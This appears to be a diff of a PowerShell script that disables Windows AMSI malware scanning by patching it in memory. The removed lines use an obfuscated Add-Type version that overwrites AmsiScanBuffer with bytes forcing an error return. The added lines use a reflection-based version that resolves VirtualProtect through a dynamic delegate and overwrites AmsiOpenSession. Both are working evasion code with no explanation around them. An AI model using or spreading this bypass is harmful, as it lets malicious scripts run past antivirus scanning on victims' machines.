@@ -1,26 +1,44 @@
-$mvzkx = @"
-using System;
-using System.Runtime.InteropServices;
-public class mvzkx {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr qxysni, uint flNewProtect, out uint lpflOldProtect);
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
 }
-"@
 
-Add-Type $mvzkx
+function getDelegateType {
 
-$pgspoyx = [mvzkx]::LoadLibrary("$(('áms'+'í.d'+'ll').NorMaLIZE([CHaR]([byTE]0x46)+[ChAR]([bYTe]0x6f)+[cHAR](114*26/26)+[CHAr](109+62-62)+[cHaR](68)) -replace [ChAr]([BYTE]0x5c)+[ChAr](99+13)+[CHAr](123+33-33)+[cHAR]([BytE]0x4d)+[CHaR](110*65/65)+[ChAr]([Byte]0x7d))")
-$ebqbyt = [mvzkx]::GetProcAddress($pgspoyx, "$([ChAr]([ByTe]0x41)+[chAr]([BYTe]0x6d)+[chAr](37+78)+[Char]([bYtE]0x69)+[CHAr]([BytE]0x53)+[CHAR](99*97/97)+[CHar](97+40-40)+[ChAR]([ByTE]0x6e)+[chAR](66+34-34)+[cHar](117)+[chAR](102*11/11)+[cHaR](102)+[cHaR]([bytE]0x65)+[CHaR]([BYTE]0x72))")
-$p = 0
-$vswd = "0xB8"
-$kbnf = "0x57"
-$hkgq = "0x00"
-$gnie = "0x07"
-$vuun = "0x80"
-$qsnk = "0xC3"
-[mvzkx]::VirtualProtect($ebqbyt, [uint32]5, 0x40, [ref]$p)
-$oylua = [Byte[]] ($vswd,$kbnf,$hkgq,$gnie,+$vuun,+$qsnk)
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48, 0x31, 0xC0) 
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
